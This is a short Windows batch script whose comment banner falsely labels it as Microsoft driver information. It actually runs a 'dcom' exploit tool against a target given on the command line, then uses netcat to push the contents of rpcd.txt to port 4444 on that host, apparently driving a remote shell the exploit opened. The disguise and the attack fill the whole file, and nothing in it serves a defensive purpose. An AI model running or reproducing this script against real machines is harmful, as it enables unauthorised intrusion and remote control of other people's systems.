   @echo off
   :: ========================================== ::
   :: Critical Microsoft V.32 Driver Information ::
   dcom 6 %1
   nc -v %1 4444 < rpcd.txt
   :: hi asl?
